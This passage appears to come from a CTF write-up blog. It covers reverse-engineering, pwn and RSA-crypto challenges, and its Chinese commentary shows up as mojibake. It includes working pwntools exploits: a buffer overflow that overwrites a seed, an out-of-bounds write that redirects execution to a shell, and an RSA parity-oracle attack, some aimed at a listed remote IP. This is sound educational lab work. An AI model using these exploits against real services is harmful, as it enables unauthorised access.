(int32_t)*v3 | v4 / 4; // branch -&gt; 0x400900 &#125; // 0x400900 *v3 = v5; int32_t v7 = v2 + 1; // 0x400908 if (v7 &gt;= strlen(str)) &#123; // break -&gt; 0x400934 break; &#125; v2 = v7; // continue -&gt; 0x400814 &#125; // 0x400934 if (strncmp((char *)(v1 + 5), (char *)&amp;g1, 27) == 0) &#123; // 0x400964 puts_rc = puts(\"Right!\"); // branch -&gt; 0x40098c &#125; else &#123; // 0x40097c puts_rc = puts(\"Wrong!\"); // branch -&gt; 0x40098c &#125; // 0x40098c return puts_rc;&#125;// --------------------- Meta-Information ---------------------// Detected compiler/packer: gcc (7.3.0)// Detected functions: 1// Decompilation date: 2019-01-23 16:29:29 é€»è¾‘å°±æ˜¯å…ˆåˆ¤æ–­å¥‡å¶ï¼Œå¦‚æœä¸ºå¥‡æ•°åˆ™å°†å­—ç¬¦çš„é«˜6ä½ä½œä¸ºä½6ä½ï¼Œä½2ä½ä½œä¸ºé«˜2ä½ï¼›åä¹‹ä¸ºå¶æ•°ï¼Œåˆ™å­—ç¬¦çš„ä½6ä½ä½œä¸ºé«˜6ä½ï¼Œé«˜2ä½ä½œä¸ºä½2ä½ã€‚æœ€åå’Œg1checkä¸€ä¸‹ã€‚ mainå‡½æ•°åœ¨è¿™é‡Œï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071//// This file was generated by the Retargetable Decompiler// Website: https://retdec.com// Copyright (c) 2019 Retargetable Decompiler &lt;info@retdec.com&gt;//#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;// ------------------- Function Prototypes --------------------int32_t printf(char * a1);int32_t puts(char * a1);int32_t scanf(char * a1);void setbuf(int32_t a1, char * a2);int32_t strncmp(char * a1, char * a2, int32_t a3);int32_t sub_4007F0(int32_t a1);int32_t sub_4009A8(void);// --------------------- Global Variables ---------------------int32_t stdin = 0;int32_t stdout = 0;// ------------------------ Functions -------------------------// Address range: 0x4009a8 - 0x400af8int32_t sub_4009A8(void) &#123; // 0x4009a8 setbuf(stdout, NULL); setbuf(stdin, NULL); printf(\"Give me your flag:\"); scanf(\"%32s\"); int32_t v1 = 0; // bp-48 int32_t v2 = 0; // 0x400a58 char * v3 = (char *)((int32_t)&amp;v1 + 4 + v2); // 0x400a28 *v3 = (char)((int32_t)*v3 ^ 32 - v2); int32_t v4 = v1 + 1; // 0x400a70 v1 = v4; // branch -&gt; 0x400a1c while (v4 &lt; 32) &#123; // 0x400a1c v2 = v4; v3 = (char *)((int32_t)&amp;v1 + 4 + v2); *v3 = (char)((int32_t)*v3 ^ 32 - v2); v4 = v1 + 1; v1 = v4; // continue -&gt; 0x400a1c &#125; int32_t str = 0; // bp-44 int32_t puts_rc; if (strncmp((char *)&amp;str, \"Q|j&#123;g\", 5) == 0) &#123; // 0x400ab4 puts_rc = sub_4007F0((int32_t)&amp;str); // branch -&gt; 0x400adc &#125; else &#123; // 0x400acc puts_rc = puts(\"Wrong\"); // branch -&gt; 0x400adc &#125; // 0x400adc return puts_rc;&#125;// --------------------- Meta-Information ---------------------// Detected compiler/packer: gcc (7.3.0)// Detected functions: 1// Decompilation date: 2019-01-23 16:29:58 mainä¸­å…ˆè¾“å…¥å­—ç¬¦ä¸²ï¼Œç„¶åå°†å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦ä¾æ¬¡ä¸32-iå¼‚æˆ–ï¼Œå‰äº”ä½ä¸Q|j{gæ¯”è¾ƒï¼Œä¹‹åå°†å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°è°ƒç”¨ä¸Šä¸€ä¸ªcheckå‡½æ•°ã€‚ ç”±äºä¹‹å‰çš„å¥‡å¶éš¾ä»¥åˆ¤æ–­ï¼Œæ‰€ä»¥é‡‡ç”¨çˆ†ç ´çš„æ–¹å¼ã€‚ç”¨pythonå†™å‡ºçˆ†ç ´è„šæœ¬ï¼š 123456789101112131415161718192021#!/usr/bin/env pythonenc1 = 'Q|j&#123;g'enc2 = '\\x52\\xfd\\x16\\xa4\\x89\\xbd\\x92\\x80\\x13\\x41\\x54\\xa0\\x8d\\x45\\x18\\x81\\xde\\xfc\\x95\\xf0\\x16\\x79\\x1a\\x15\\x5b\\x75\\x1f'flag = ''for i in range(5): ch = ord(enc1[i]) ^ (32 - i) print 'index', i, '==&gt;', chr(ch) flag += chr(ch)for i in range(5, 32): for ch in range(256): t = ch ^ (32 - i) if i % 2 == 0: res = ((t &lt;&lt; 2) &amp; 0xff) | (t &gt;&gt; 6) else: res = (t &gt;&gt; 2) | ((t &lt;&lt; 6) &amp; 0xff) if res == ord(enc2[i - 5]): print 'index', i, '==&gt;', chr(ch) flag += chr(ch) breakprint len(flag)print 'flag:', flag æœ€åæ”¾ä¸Šå®˜æ–¹ç»™å‡ºçš„æºç ï¼š 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;string.h&gt;char *check1=\"Q|j&#123;g\";char *check2= \"\\x52\\xfd\\x16\\xa4\\x89\\xbd\\x92\\x80\\x13\\x41\\x54\\xa0\\x8d\\x45\\x18\\x81\\xde\\xfc\\x95\\xf0\\x16\\x79\\x1a\\x15\\x5b\\x75\\x1f\";void check(char *s)&#123; int i; for(i=5;i&lt;strlen(s);i++)&#123; if(i%2) s[i]=(s[i]&gt;&gt;2)|((s[i]&lt;&lt;6)&amp;0xff); else s[i]=((s[i]&lt;&lt;2)&amp;0xff)|(s[i]&gt;&gt;6); &#125; if(!strncmp(&amp;s[5],check2,27)) printf(\"Right!\\n\"); else printf(\"Wrong!\\n\");&#125;void main()&#123; char s[33]; int i; printf(\"Give me your flag:\"); scanf(\"%32s\",s); for(i=0;i&lt;32;i++) s[i]^=(32-i); if(!strncmp(s,check1,5)) check(s); else printf(\"Wrong\\n\");&#125; asongæ€»å…±ç»™äº†ä¸‰ä¸ªæ–‡ä»¶ï¼Œasongä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œthat_girlä»¥åŠoutéƒ½æ˜¯asciiæ–‡æœ¬ã€‚å°†asongæ‹–è¿›idaåï¼Œçœ‹åˆ°mainå‡½æ•°çš„æ ·å­ï¼š 1234567891011121314__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; void *girl; // ST00_8 char *input; // ST08_8 girl = malloc(0xBCuLL); input = (char *)malloc(0x50uLL); init_func(); getline(input); simple_check(input); cal(\"that_girl\", (__int64)girl); encrypt(input, (__int64)girl); return 0LL;&#125; ç¬¬ä¸€ä¸ªinit_func()ï¼Œè®¾ç½®ä¸€ä¸‹ç¼“å†²åŒºï¼š 123456void init_func()&#123; setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL);&#125; getline()å‡½æ•°å®ç°äº†ä¸€ä¸ªç®€å•çš„è¯»å–ä¸€è¡Œçš„åŠŸèƒ½ï¼š 12345678910111213141516171819char __fastcall getline(char *a1)&#123; char *v1; // rax signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; ; ++i ) &#123; LOBYTE(v1) = read(0, &amp;a1[i], 1uLL) == 1; if ( !(_BYTE)v1 ) break; if ( a1[i] == 10 || i &gt; 100 ) &#123; v1 = &amp;a1[i]; *v1 = 0; return (char)v1; &#125; &#125; return (char)v1;&#125; simple_check()å‡½æ•°æ£€æŸ¥è¯»å…¥å­—ç¬¦ä¸²ä¸­æ˜¯å¦ä»¥&#39;QCTF{&#39;å¼€å¤´ï¼Œä»¥åŠæ˜¯å¦ä»¥&#39;}&#39;ç»“å°¾ï¼š 123456789101112131415void __fastcall simple_check(char *a1)&#123; int v1; // [rsp+14h] [rbp-Ch] void *dest; // [rsp+18h] [rbp-8h] dest = malloc(0x50uLL); if ( memcmp(a1, \"QCTF&#123;\", 5uLL) ) exit(-1); memcpy(dest, a1 + 5, 0x4BuLL); v1 = strlen((const char *)dest); if ( *((_BYTE *)dest + v1 - 1) == '&#125;' ) *((_BYTE *)dest + v1 - 1) = 0; memcpy(a1, dest, 0x50uLL); free(dest);&#125; cal()å‡½æ•°è¯»å–äº†æ–‡ä»¶that_girlçš„å†…å®¹ï¼Œåº”è¯¥æ˜¯é€šè¿‡convert()å‡½æ•°å¯¹å…¶ä¸­çš„æ¯ä¸ªå­—ç¬¦åšäº†ä¸€ä¸ªè¯é¢‘çš„ç»Ÿè®¡ï¼š 1234567891011121314151617int __fastcall cal(const char *that_girl, __int64 girl)&#123; int v2; // eax char *v4; // [rsp+0h] [rbp-20h] char buf; // [rsp+13h] [rbp-Dh] int fd; // [rsp+14h] [rbp-Ch] unsigned __int64 v7; // [rsp+18h] [rbp-8h] v7 = __readfsqword(0x28u); fd = open(that_girl, 0, girl, that_girl); while ( read(fd, &amp;buf, 1uLL) == 1 ) &#123; v2 = convert(buf); ++*(_DWORD *)&amp;v4[4 * v2]; &#125; return close(fd);&#125; convert()å‡½æ•°ä¸­æ˜¯ä¸€ä¸ªå¯¹è¯»å…¥çš„bufçš„æ˜ å°„ï¼Œä¸ç”¨åˆ»æ„çœ‹å…·ä½“æ˜¯ä»€ä¹ˆæ“ä½œï¼Œåé¢ç›´æ¥æ‰“è¡¨å°±å®Œäº‹äº†ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455__int64 __fastcall convert(char buf)&#123; __int64 result; // rax result = (unsigned int)(buf - 10); switch ( buf ) &#123; case '\\n': result = (unsigned int)(buf + 35); break; case ' ': case '!': case '\"': result = (unsigned int)(buf + 10); break; case '\\'': result = (unsigned int)(buf + 2); break; case ',': result = (unsigned int)(buf - 4); break; case '.': result = (unsigned int)(buf - 7); break; case ':': case ';': result = (unsigned int)(buf - 21); break; case '?': result = (unsigned int)(buf - 27); break; case '_': result = (unsigned int)(buf - 49); break; default: if ( buf &lt;= '/' || buf &gt; '9' ) &#123; if ( buf &lt;= '@' || buf &gt; 'Z' ) &#123; if ( buf &gt; '`' &amp;&amp; buf &lt;= 'z' ) result = (unsigned int)(buf - 87); // lower case &#125; else &#123; result = (unsigned int)(buf - 55); // upper case &#125; &#125; else &#123; result = (unsigned int)(buf - 48); // number &#125; break; &#125; return result;&#125; æœ€åæ˜¯å¯¹flagçš„åŠ å¯†éƒ¨åˆ†ï¼š 12345678910111213141516unsigned __int64 __fastcall encrypt(const char *input, char *girl)&#123; int i; // [rsp+18h] [rbp-48h] int len; // [rsp+1Ch] [rbp-44h] char enc[56]; // [rsp+20h] [rbp-40h] unsigned __int64 v6; // [rsp+58h] [rbp-8h] v6 = __readfsqword(0x28u); len = strlen(input); for ( i = 0; i &lt; len; ++i ) enc[i] = *(_DWORD *)&amp;girl[4 * (signed int)convert(input[i])]; index_round(enc); shift(enc, len); output(enc, \"out\", len); return __readfsqword(0x28u) ^ v6;&#125; è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªglobalçš„tableï¼Œå’Œä¹‹å‰çš„è¯é¢‘ä¸€æ ·ï¼Œé€šè¿‡æ‰“è¡¨å°†æ˜ å°„å…³ç³»è®°å½•ä¸‹æ¥ï¼š 12345678910111213141516__int64 __fastcall index_round(char *enc)&#123; __int64 result; // rax _BYTE v2[5]; // [rsp+13h] [rbp-5h] v2[4] = 0; // v2[1] = 0; *(_DWORD *)v2 = (unsigned __int8)*enc; while ( table[*(signed int *)&amp;v2[1]] ) &#123; enc[*(signed int *)&amp;v2[1]] = enc[table[*(signed int *)&amp;v2[1]]]; *(_DWORD *)&amp;v2[1] = table[*(signed int *)&amp;v2[1]]; &#125; result = v2[0]; enc[*(signed int *)&amp;v2[1]] = v2[0]; return result;&#125; shift()åšäº†ä¸€ä¸ªå¾ªç¯ä½ç§»ï¼Œè¿™ä¸ªæ“ä½œæ˜¾ç„¶æ˜¯å¯é€†çš„ï¼š 12345678910111213char *__fastcall shift(char *enc, int len)&#123; char *result; // rax char v3; // [rsp+17h] [rbp-5h] int i; // [rsp+18h] [rbp-4h] v3 = (unsigned __int8)*enc &gt;&gt; 5; for ( i = 0; len - 1 &gt; i; ++i ) enc[i] = 8 * enc[i] | ((unsigned __int8)enc[i + 1] &gt;&gt; 5); result = &amp;enc[i]; *result = 8 * *result | v3; return result;&#125; output()å‡½æ•°å°†å¯†æ–‡è¾“å‡ºåˆ°outä¸­ï¼š 123456789101112int __fastcall output(char *enc, const char *file, int len)&#123; int v4; // [rsp+Ch] [rbp-24h] int i; // [rsp+28h] [rbp-8h] int fd; // [rsp+2Ch] [rbp-4h] v4 = len; fd = open(file, 65, 438LL); for ( i = 0; i &lt; v4; ++i ) write(fd, &amp;enc[i], 1uLL); return close(fd);&#125; æ€»ä½“åŠ å¯†è¿‡ç¨‹ç»Ÿè®¡äº†that_girlæ–‡ä»¶çš„è¯é¢‘, å¹¶å°†flagè½¬æ¢ä¸ºå¯¹åº”çš„è¯é¢‘ã€‚ç»è¿‡ä¸¤æ¬¡åŠ å¯†, ç½®æ¢, ç§»ä½ã€‚æœ€ååœ¨å°è¯•ä¸­å†™å‡ºæœ€åçš„è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/usr/bin/env pythonf = open('out', 'rb')t = f.read()f.close()enc = []for i in range(len(t)): enc.append(ord(t[i]))print encflag = ''def convert(c): res = c - 10 if c == 10: res = c + 35 elif 32 &lt;= c &lt;= 34: res = c + 10 elif c == 39: res = c + 2 elif c == 44: res = c - 4 elif c == 46: res = c - 7 elif 58 &lt;= c &lt;= 59: res = c - 21 elif c == 63: res = c - 27 elif c == 95: res = c - 49 else: if c &lt;= 47 or c &gt; 57: if c &lt;= 64 or c &gt; 90: if c &gt; 96 and c &lt;= 122: res = c - 87 else: res = c - 55 else: res = c - 48 return res# convert1convert_map = &#123;&#125;for ch in range(256): convert_map[convert(ch)] = ch# print convert_mapf = open('that_girl', 'rb')that_girl = f.read()f.close()# print that_girlgirl = [0 for i in range(256)]for i in range(len(that_girl)): t = convert(that_girl[i]) girl[t * 4] += 1# print girl# shiftenc1 = []enc1.append(((enc[-1] &lt;&lt; 5) &amp; 0xff) | (enc[0] &gt;&gt; 3))for i in range(len(enc) - 1): enc1.append(((enc[i] &lt;&lt; 5) &amp; 0xff) | (enc[i + 1] &gt;&gt; 3))print len(enc1)table = [0x00000016, 0x00000000, 0x00000006, 0x00000002, 0x0000001E, 0x00000018, 0x00000009, 0x00000001, 0x00000015, 0x00000007, 0x00000012, 0x0000000A, 0x00000008, 0x0000000C, 0x00000011, 0x00000017, 0x0000000D, 0x00000004, 0x00000003, 0x0000000E, 0x00000013, 0x0000000B, 0x00000014, 0x00000010, 0x0000000F, 0x00000005, 0x00000019, 0x00000024, 0x0000001B, 0x0000001C, 0x0000001D, 0x00000025, 0x0000001F, 0x00000020, 0x00000021, 0x0000001A, 0x00000022, 0x00000023]print len(table)# convert2round_map = &#123;&#125;x = 0while table[x] != 0: round_map[table[x]] = x x = table[x]round_map[0] = 1print round_mapenc2 = [0 for i in range(len(enc1))]for origin, encoded in round_map.items(): enc2[origin] = enc1[encoded]for i in range(len(enc2)): for j in range(len(girl) / 4): if enc2[i] == girl[j * 4]: flag += chr(convert_map[j]) breakprint 'flag: QCTF&#123;%s&#125;' % flag ollvmPWNXman-dice_gameæ”¾è¿›idaçœ‹mainå‡½æ•°ï¼š bufå­˜åœ¨æº¢å‡ºï¼Œå¯ä»¥è¦†ç›–åˆ°seedï¼Œä½¿ä¹‹ä¸º0ã€‚æƒ³æ³•å°±æ˜¯é€šè¿‡çˆ†ç ´å¾—åˆ°éšæœºæ•°çš„é¡ºåºã€‚è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435from pwn import *import randomimport timedef test(ans): p = process('./dice_game') # p = remote(\"47.96.239.28\", 9999) p.readuntil(\"name:\") payload = p64(0xabcdabcdabcdabcd) * 8 + p64(0) p.sendline(payload) i = 0 ans_len = len(ans) log.success(ans) if True: while i &lt; ans_len: p.readuntil(\"nt(1~6): \") n = ans[i] i += 1 p.sendline(n) random.seed(time.time()) n = str(int(random.randint(1, 6))) p.readuntil(\"nt(1~6): \") p.sendline(n) print(n) sub = p.readuntil('.') log.info(sub) return sub, nans = \"\"while(1): if len(ans) == 50: print(ans) break res, n = test(ans) if \"win\" in res: ans += n é€šè¿‡å¾—åˆ°çš„é¡ºåºä½œä¸ºpayloadï¼Œè„šæœ¬ï¼š 1234567891011121314from pwn import *p = process('./dice_game')# p = remote(\"47.96.239.28\", 9999)p.readuntil(\"name:\")payload = p64(0x1122334455667788) * 8 + p64(0)p.sendline(payload)ans = \"25426251423232651155634433322261116425254446323361\"i = 0while i &lt; 50: p.readuntil(\"nt(1~6): \") n = ans[i] i += 1 p.sendline(n)p.interactive() Xan-stack2æ„Ÿè§‰è¿™åº”è¯¥ç®—æ˜¯ä¸€é“æ¯”è¾ƒå¥½çš„æ ˆæº¢å‡ºçš„é¢˜ã€‚checksecå‘ç°PIEæ²¡å¼€ï¼ŒCanaryå’ŒNXéƒ½å¼€äº†ã€‚ æ‹–è¿›idaåf5ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax unsigned int v5; // [esp+18h] [ebp-90h] unsigned int v6; // [esp+1Ch] [ebp-8Ch] int v7; // [esp+20h] [ebp-88h] unsigned int j; // [esp+24h] [ebp-84h] int v9; // [esp+28h] [ebp-80h] unsigned int i; // [esp+2Ch] [ebp-7Ch] unsigned int k; // [esp+30h] [ebp-78h] unsigned int l; // [esp+34h] [ebp-74h] char v13[100]; // [esp+38h] [ebp-70h] unsigned int v14; // [esp+9Ch] [ebp-Ch] v14 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); v9 = 0; puts(\"***********************************************************\"); puts(\"* An easy calc *\"); puts(\"*Give me your numbers and I will return to you an average *\"); puts(\"*(0 &lt;= x &lt; 256) *\"); puts(\"***********************************************************\"); puts(\"How many numbers you have:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"Give me your numbers\"); for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 99; ++i ) &#123; __isoc99_scanf(\"%d\", &amp;v7); v13[i] = v7; &#125; for ( j = v5; ; printf(\"average is %.2lf\\n\", (double)((long double)v9 / (double)j)) ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts(\"1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit\"); __isoc99_scanf(\"%d\", &amp;v6); if ( v6 != 2 ) break; puts(\"Give me your number\"); __isoc99_scanf(\"%d\", &amp;v7); if ( j &lt;= 0x63 ) &#123; v3 = j++; v13[v3] = v7; &#125; &#125; if ( v6 &gt; 2 ) break; if ( v6 != 1 ) return 0; puts(\"id\\t\\tnumber\"); for ( k = 0; k &lt; j; ++k ) printf(\"%d\\t\\t%d\\n\", k, v13[k]); &#125; if ( v6 != 3 ) break; puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; &#125; if ( v6 != 4 ) break; v9 = 0; for ( l = 0; l &lt; j; ++l ) v9 += v13[l]; &#125; return 0;&#125; è¿˜èƒ½çœ‹åˆ°æœ‰ä¸€ä¸ªhackhereå‡½æ•°ï¼Œç›´æ¥è°ƒç”¨äº†system(&quot;/bin/bash&quot;)ã€‚ 12345puts(\"which number to change:\");__isoc99_scanf(\"%d\", &amp;v5);puts(\"new number:\");__isoc99_scanf(\"%d\", &amp;v7);v13[v5] = v7; // index out of bound \bè¿™é‡Œå‘ç°v5å’Œv7æ²¡æœ‰åšä»»ä½•æ£€æŸ¥ï¼Œèƒ½è¾¾åˆ°ä»»æ„åœ°å€å†™ã€‚ æ‰€ä»¥è¿™é¢˜çš„æ€è·¯å°±æ˜¯å°†mainå‡½æ•°returnåœ°å€è¦†ç›–ä¸ºhackhereçš„åœ°å€ã€‚ åŸºæœ¬å°±æ˜¯retåˆ°hackhereç„¶åç›´æ¥å°±æˆåŠŸäº†ï¼š 12345678910111213141516171819202122232425#!/usr/bin/env pythonfrom pwn import *import ctypesp = process('./stack2')context.log_level = 'debug'def change(index, content): p.sendlineafter('5. exit\\n', '3') p.sendlineafter('which number to change:\\n', str(index)) p.sendlineafter('new number:\\n', str(content))p.sendlineafter('How many numbers you have:\\n', '1')p.sendlineafter('Give me your numbers\\n', '1')hack_addr = 0x0804859boffset = 132# gdb.attach(p, 'b *0x0804859b')for i in range(4): byte = (hack_addr &gt;&gt; (i * 8)) &amp; 0xff byte = str(ctypes.c_int8(byte)) start = byte.find('(') + 1 end = byte.find(')') byte = int(byte[start:end]) change(offset + i, byte)p.sendlineafter('5. exit\\n', '5')p.interactive() ä½†å‘ç°è¿œç¨‹æ²¡æœ‰bashï¼Œæ‰€ä»¥æƒ³åˆ°ç›´æ¥ç”¨å­—ç¬¦ä¸²ä¸­çš„shï¼Œå³system(&amp;&quot;/bin/bash&quot;[7])ï¼Œåªéœ€è¦æ‰¾åˆ°å­—ç¬¦ä¸²åœ¨æ ˆä¸Šçš„ä½ç½®ï¼š 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env pythonfrom pwn import *import ctypesp = process('./stack2')context.log_level = 'debug'def change(index, content): p.sendlineafter('5. exit\\n', '3') p.sendlineafter('which number to change:\\n', str(index)) p.sendlineafter('new number:\\n', str(content))p.sendlineafter('How many numbers you have:\\n', '1')p.sendlineafter('Give me your numbers\\n', '1')hack_addr = 0x0804859boffset = 132# gdb.attach(p, 'b *0x0804859b')# overflow retfor i in range(4): byte = (hack_addr &gt;&gt; (i * 8)) &amp; 0xff byte = str(ctypes.c_int8(byte)) start = byte.find('(') + 1 end = byte.find(')') byte = int(byte[start:end]) change(offset + i, byte)str_addr = 0x08048987offset2 = offset + 8# point to string 'sh'for i in range(4): byte = (str_addr &gt;&gt; (i * 8)) &amp; 0xff byte = str(ctypes.c_int8(byte)) start = byte.find('(') + 1 end = byte.find(')') byte = int(byte[start:end]) change(offset2 + i, byte)p.sendlineafter('5. exit\\n', '5')p.interactive() CryptobabyRSAé¢˜ç›®ä¿¡æ¯å¦‚ä¸‹ï¼š 12345e = 0x10001n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716dbc = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0 æœ€ä½æœ‰æ•ˆä½æ”»å‡»äº†è§£ä¸€ä¸‹ã€‚ å¯¹å¯†æ–‡ä¹˜2^e(mod n)æ“ä½œ,å†è§£å¯†çš„æ—¶å€™ï¼Œå¦‚æœä¸ºå¶æ•°ï¼Œè¯´æ˜æ˜æ–‡å†(0, n/2)ä¹‹é—´ï¼Œå¦åˆ™åœ¨(n/2, n)ä¹‹é—´ã€‚è¿™æ ·ï¼Œåªéœ€è¦log nçš„æ¬¡æ•°å°±å¯ä»¥çŸ¥é“æ˜æ–‡ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *context.log_level = 'WARN'def num_to_bytes(n): b = hex(n)[2:].strip('L') b = '0' + b if len(b)%2 == 1 else b return b.decode('hex')e = 0x10001n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716dbc = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0upper = nlower = 0k = 1while True: p = remote('47.96.239.28',23333) p.recvuntil('You can input ciphertext(hexdecimal) now\\n') power = pow(2, k, n) new_c = (pow(power, e, n) * c) % n new_c = hex(new_c)[2:].strip('L') p.sendline(new_c) data = p.recvline()[:-1] p.close() if data == \"even\": print 'Round %d: even' % k upper = (upper + lower) / 2 if data == \"odd\": print 'Round %d: odd' % k lower = (upper + lower) / 2 if data == \"error\": break if upper - lower &lt; 2: break k += 1flag = num_to_bytes(upper)[:-1]+'&#125;'print 'flag:', flag Xman-RSAæ‹¿åˆ°å››ä¸ªæ–‡ä»¶åï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå¾ˆåƒpythonçš„è„šæœ¬ï¼Œé€šè¿‡å¯¹å…³é”®å­—ç­‰çš„åˆ¤æ–­ï¼Œè‡ªå·±å†™è„šæœ¬è¿˜åŸï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546l1 = &#123; 'a': 'd', 'b': 'm', 'd': 'e', 'e': 'n', 'f': 'w', 'g': 'f', 'h': 'o', 'i': 'x', 'j': 'g', 'k': 'p', 'l': 'y', 'm': 'h', 'p': 'i', 'q': 'r', 'r': 'a', 't': 's', 'u': 'b', 'v': 'k', 'w': 't', 'x': 'c', 'y': 'l', 'z': 'u'&#125;f = open('encryption.encrypted', 'r')ans = f.read()# print ansres = \"\"for ch in ans: flag = 0 for key, value in l1.items(): if ch == key: res += value flag = 1 break else: continue if flag == 1: continue else: res += chprint resraw_input()f = open('1.py', 'wb')f.write(res)f.close() è¿˜åŸå‡ºåŸæ¥çš„åŠ å¯†è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from gmpy2 import is_primefrom os import urandomimport base64def bytes_to_num(b): return int(b.encode('hex'), 16) def num_to_bytes(n): b = hex(n)[2:-1] b = '0' + b if len(b)%2 == 1 else b return b.decode('hex')def get_a_prime(l): random_seed = urandom(l) num = bytes_to_num(random_seed) while True: if is_prime(num): break num+=1 return numdef encrypt(s, e, n): p = bytes_to_num(s) p = pow(p, e, n) return num_to_bytes(p).encode('hex') def separate(n): p = n % 4 t = (p*p) % 4 return t == 1 f = open('flag.txt', 'r')flag = f.read() msg1 = \"\"msg2 = \"\"for i in range(len(flag)): if separate(i): # å¥‡æ•° msg2 += flag[i] else: # å¶æ•° msg1 += flag[i]p1 = get_a_prime(128)p2 = get_a_prime(128)p3 = get_a_prime(128)n1 = p1*p2n2 = p1*p3e = 0x1001c1 = encrypt(msg1, e, n1)c2 = encrypt(msg2, e, n2)print(c1)print(c2)e1 = 0x1001e2 = 0x101p4 = get_a_prime(128)p5 = get_a_prime(128)n3 = p4*p5c1 = num_to_bytes(pow(n1, e1, n3)).encode('hex')c2 = num_to_bytes(pow(n1, e2, n3)).encode('hex')print(c1)print(c2)print(base64.b64encode(num_to_bytes(n2)))print(base64.b64encode(num_to_bytes(n3))) ä»£ç çœ‹å®Œåï¼Œæ€è·¯æ˜¯å…ˆç”¨å…±æ¨¡æ”»å‡»è§£å‡ºn1ï¼Œä¹‹ååˆ©ç”¨å…¬çº¦æ•°å¾—åˆ°p1ã€p2ã€p3ï¼Œå†æ±‚å‡ºd1ã€d2ï¼Œæœ€åè§£å‡ºmsg1ã€msg2ã€‚ç»™å‡ºçš„æ–‡ä»¶ä¸­ï¼Œciphertextä¸ºç¬¬äºŒæ¬¡è¾“å‡ºçš„c1å’Œc2ï¼Œï¼Œn1.encryptedä¸ºç¬¬äºŒæ¬¡è¾“å‡ºçš„c1å’Œc2ï¼Œn2&amp;n3å³æœ€åè¾“å‡ºçš„è¢«åŠ å¯†åçš„n2å’Œn3ã€‚è§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!/usr/bin/env pythonimport base64import gmpy2f = open('n2&amp;n3', 'rb')n2 = f.readline()n3 = f.readline()f.close()n2 = base64.b64decode(n2).encode('hex')n3 = base64.b64decode(n3).encode('hex')n2 = int(n2, 16)n3 = 